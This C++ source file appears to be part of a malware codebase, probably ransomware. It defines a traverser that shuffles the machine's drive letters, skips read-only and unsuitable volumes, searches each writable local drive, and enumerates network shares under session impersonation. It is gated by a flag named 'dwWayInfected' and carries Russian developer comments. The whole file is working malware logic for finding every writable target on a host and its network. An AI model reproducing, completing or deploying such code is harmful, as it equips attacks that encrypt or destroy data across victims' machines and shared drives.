#include "traverser.hpp"
#include "utils.hpp"
#include "shares.h"

DefaultTraverse::DefaultTraverse()
{
#ifdef _DEBUG
	WriteLog(L"[DefaultTraverse] constructor");
#endif

	RtlSecureZeroMemory(&this->bDrivePointers, sizeof(this->bDrivePointers));
	RtlSecureZeroMemory(&this->SearchParam, sizeof(this->SearchParam));
	RtlSecureZeroMemory(&this->bRandomAccessIndexes, sizeof(this->bRandomAccessIndexes));
	this->pwDriveStrings = nullptr;
	this->impersonator = nullptr;
	this->_bNetworkSearch = FALSE;
	this->_bLocalSearch = FALSE;
}

DefaultTraverse::~DefaultTraverse()
{
#ifdef _DEBUG
	WriteLog(L"[DefaultTraverse] destructor");
#endif

	if (this->bRandomAccessIndexes.lpBuffer != nullptr)
		delete[]this->bRandomAccessIndexes.lpBuffer;

	if (this->pwDriveStrings != nullptr)
		delete[]this->pwDriveStrings;

	if (this->bDrivePointers.lpBuffer != nullptr)
		delete[]this->bDrivePointers.lpBuffer;

	if (this->impersonator != nullptr)
		delete this->impersonator;

	RtlSecureZeroMemory(&this->SearchParam, sizeof(this->SearchParam));
}

BOOL DefaultTraverse::init(search_api::search_parameter * psp, DWORD dwSearchParamSize, BOOL bLocalSearch, BOOL bNetworkSearch)
{
	if ((dwSearchParamSize != sizeof(this->SearchParam)) || (psp == nullptr) || ((!bLocalSearch) && (!bNetworkSearch)))
		return FALSE;

	if ((global_data::pExtendedDataCopy != nullptr) && (global_data::pExtendedDataCopy->dwWayInfected & M0YV_FNO_SEARCH))
	{
#ifdef _DEBUG
		WriteLog(L"[DefaultTraverse::init] M0YV_FNO_SEARCH is set, exiting from traversing...");
#endif
		return FALSE;
	}

	this->_bLocalSearch = bLocalSearch;
	this->_bNetworkSearch = bNetworkSearch;

#ifdef _DEBUG
	WCHAR debugOut[1024];
#endif
	
	BOOL bRet = FALSE;
	_RtlCopyMemory((LPBYTE)&this->SearchParam, (LPBYTE)psp, dwSearchParamSize);
	SIZE_T dwStringsSize = 0;
	SIZE_T dwRetSize = 0;
	PWCHAR pwDriveStrPtr = nullptr;
	do
	{
		this->impersonator = (IImpersonate*)new sessionimpersonator::ThreadSessionImpersonator;
		if (this->impersonator == nullptr)
			break;

		dwStringsSize = GetLogicalDriveStringsW(0, nullptr);
		if (dwStringsSize == 0)
		{
#ifdef _DEBUG
			WriteLog(L"[DefaultTraverse::init] cant get size for logical drive strings");
#endif
			break;
		}

		this->pwDriveStrings = new WCHAR[dwStringsSize + 1];
		if (this->pwDriveStrings == nullptr)
			break;

		dwRetSize = GetLogicalDriveStringsW(dwStringsSize, this->pwDriveStrings);
		if ((dwRetSize > dwStringsSize) || (dwRetSize == 0))
		{
#ifdef _DEBUG
			WriteLog(L"[DefaultTraverse::init] error either logical drive strings failed unexpectedly or new drives were attached between size calc and actual retrieval");
#endif
			break;
		}

		UINT iStringsAmount = this->strings_amount();
		if (iStringsAmount == 0) // не должно быть никогда, но пусть будет на случай изменений в коде как предохранитель
			break;

#ifdef _DEBUG
		wsprintfW(debugOut, L"[DefaultTraverse::init] total drives %d", iStringsAmount);
		WriteLog(debugOut);
#endif

		this->bDrivePointers.dwBufSize = sizeof(PWCHAR) * iStringsAmount;
		this->bRandomAccessIndexes.dwBufSize = sizeof(UINT) * iStringsAmount;

		this->bDrivePointers.lpBuffer = (LPBYTE)new PWCHAR[iStringsAmount + 1];
		this->bRandomAccessIndexes.lpBuffer = (LPBYTE)new UINT[iStringsAmount + 1];
		if ((this->bDrivePointers.lpBuffer == nullptr) || (this->bRandomAccessIndexes.lpBuffer == nullptr))
			break;

		UINT iIndex = 0;
		pwDriveStrPtr = &this->pwDriveStrings[0];
		PUINT piIndexArr = (PUINT)this->bRandomAccessIndexes.lpBuffer;
		PWCHAR *pwchStringArr = (PWCHAR*)this->bDrivePointers.lpBuffer;

		while (*pwDriveStrPtr != L'\0')
		{
			piIndexArr[iIndex] = iIndex; // индексы для доступа к массиву указателей, которые в последствии зарандомим и тогда доступ через pwchStringArr[piIndexArr[i]] будет в случайном порядке
			pwchStringArr[iIndex] = pwDriveStrPtr;

#ifdef _DEBUG
			wsprintfW(debugOut, L"[DefaultTraverse::init] Drive: %s, index = %d", pwchStringArr[iIndex], piIndexArr[iIndex]);
			WriteLog(debugOut);
#endif

			iIndex++;
			pwDriveStrPtr += wcslen(pwDriveStrPtr) + 1;
		}

		bRet = TRUE;
		// перемешаем массив индексов, чтобы в последствии мы могли обращаться в рандомизированном порядке к меткам дисков
		long holdrand = GetTickCount();
		shuffle(&holdrand, (LPINT)piIndexArr, iStringsAmount);

	} while (FALSE);

	return bRet;
}

BOOL DefaultTraverse::traverse()
{
	BOOL bRet = TRUE;

	if (this->_bLocalSearch)
		bRet &= this->local_search();

	if (this->_bNetworkSearch)
		bRet &= this->network_search();
	
	return bRet;
}

UINT DefaultTraverse::strings_amount()
{
	if (this->pwDriveStrings == nullptr)
		return 0;

	UINT iRet = 0;
	PWCHAR pwDriveStrPtr = &this->pwDriveStrings[0];

	while (*pwDriveStrPtr != L'\0')
	{
		iRet++;
		pwDriveStrPtr += wcslen(pwDriveStrPtr) + 1;
	}

	return iRet;
}

BOOL DefaultTraverse::validate_drive(PWCHAR pwchDrive)
{
	if ((pwchDrive == nullptr) || (pwchDrive[0] == L'\0'))
		return FALSE;

	DWORD dwFileSystemFlags = 0;
	BOOL bRet = FALSE;
	do
	{
		DWORD dwDriveType = GetDriveTypeW(pwchDrive);

		if ((dwDriveType != DRIVE_REMOVABLE) && (dwDriveType != DRIVE_FIXED) && (dwDriveType != DRIVE_REMOTE))
		{
#ifdef _DEBUG
			WriteLog(L"[DefaultTraverse::validate_drive] bad drive type ", pwchDrive);
#endif
			break;
		}

		if (!GetVolumeInformationW(pwchDrive, nullptr, NULL, nullptr, nullptr, &dwFileSystemFlags, nullptr, NULL))
		{
#ifdef _DEBUG
			WriteLog(L"[DefaultTraverse::validate_drive] filesystem is not available at ", pwchDrive);
#endif
			break;
		}

		if (dwFileSystemFlags & FILE_READ_ONLY_VOLUME)
		{
#ifdef _DEBUG
			WriteLog(L"[DefaultTraverse::validate_drive] volume is read only ", pwchDrive);
#endif
			break;
		}

		bRet = TRUE;

	} while (FALSE);

	return bRet;
}

BOOL DefaultTraverse::local_search()
{
	
	BOOL bRet = FALSE;

	PUINT piIndexArr = (PUINT)this->bRandomAccessIndexes.lpBuffer;
	PWCHAR *pwchStringArr = (PWCHAR*)this->bDrivePointers.lpBuffer;

	if ((piIndexArr == nullptr) || (pwchStringArr == nullptr) || (this->pwDriveStrings == nullptr))
		return FALSE;

	SIZE_T dwRandomAccessElementsAmount = this->bRandomAccessIndexes.dwBufSize / sizeof(UINT);
	SIZE_T dwDrivePointersElementsAmount = this->bDrivePointers.dwBufSize / sizeof(PWCHAR);

	if (dwRandomAccessElementsAmount != dwDrivePointersElementsAmount)
	{
#ifdef _DEBUG
		WriteLog(L"[DefaultTraverse::local_search] error bRandomAccessIndexes amount of elements != amount in bDrivePointers");
#endif
		return FALSE;
	}

	do
	{
		for (UINT iIndex = 0; iIndex < dwRandomAccessElementsAmount; iIndex++)
		{
			PWCHAR pwchDrive = pwchStringArr[piIndexArr[iIndex]]; // piIndexArr содержит перемешанные индексы от 0 до N, где N - количество строк
			if (!this->validate_drive(pwchDrive))
				continue;

#ifdef _DEBUG
			WriteLog(L"[DefaultTraverse::local_search] searching on ", pwchDrive);
#endif
			this->SearchParam.pwEntrySearch = pwchDrive;
			search_api::search(&this->SearchParam);
			this->SearchParam.pwEntrySearch = nullptr;
		}

		bRet = TRUE;

	} while (FALSE);

	return bRet;
}

BOOL DefaultTraverse::network_search()
{
	
	sessionimpersonator::thrImpersonateParam param;
	RtlSecureZeroMemory(&param, sizeof(param));
	
	param.bInvokeNoImp = TRUE;
	param.callbackParam.lpBuffer = (LPBYTE)&this->SearchParam;
	param.callbackParam.dwBufSize = sizeof(this->SearchParam);
	param.fnCallback = shares::enumerate;

	BOOL bRet = FALSE;
	do
	{
		if (this->impersonator == nullptr)
			break;

		if (!this->impersonator->initialize((LPBYTE)&param, sizeof(param)))
			break;

		if (!this->impersonator->impersonate())
			break;

		bRet = TRUE;

	} while (FALSE);

	return bRet;
}
